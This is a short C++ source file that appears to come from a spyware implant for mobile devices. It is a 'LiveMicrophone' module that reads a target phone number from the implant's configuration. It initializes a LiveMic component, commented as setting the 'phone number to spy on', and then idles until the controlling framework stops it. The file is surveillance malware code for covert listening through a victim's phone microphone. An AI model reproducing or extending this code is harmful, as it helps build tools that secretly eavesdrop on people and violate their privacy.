#include "Common.h"
#include "Module.h"
#include "LiveMic.h"

DWORD WINAPI LiveMicModule(LPVOID lpParam) {
	wstring number;

	Module *me = (Module *)lpParam;
	Configuration *conf = me->getConf();
	HANDLE eventHandle;

	try {
		number = conf->getString(L"number");
	} catch (...) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	if (number.empty()) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - LiveMicrophone.cpp - LiveMicrophone Module started\n", 5, FALSE);

	LiveMic *pMic = NULL;
	pMic = pMic->self();

	if (!pMic) {
		DBG_TRACE(L"Debug - LiveMicrophone.cpp - LiveMicrophone Module Failed 3\n", 5, FALSE);
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	DBG_TRACE(L"Debug - LiveMicrophone.cpp - LiveMicrophone Module started\n", 5, FALSE);

	// Set phone number to spy on
	if (!pMic->Initialize(number, g_hInstance)) {
		DBG_TRACE(L"Debug - LiveMicrophone.cpp - LiveMicrophone Module Failed 4\n", 5, FALSE);
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	DBG_TRACE(L"Debug - LiveMicrophone.cpp - LiveMicrophone Module Initialized\n", 5, FALSE);

	LOOP {
		WaitForSingleObject(eventHandle, INFINITE);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - LiveMicrophone.cpp - LiveMicrophone Module clean stop\n", 1, FALSE);
			pMic->Uninitialize();

			me->setStatus(MODULE_STOPPED);
			return 0;
		}
	}

	return 0;
}	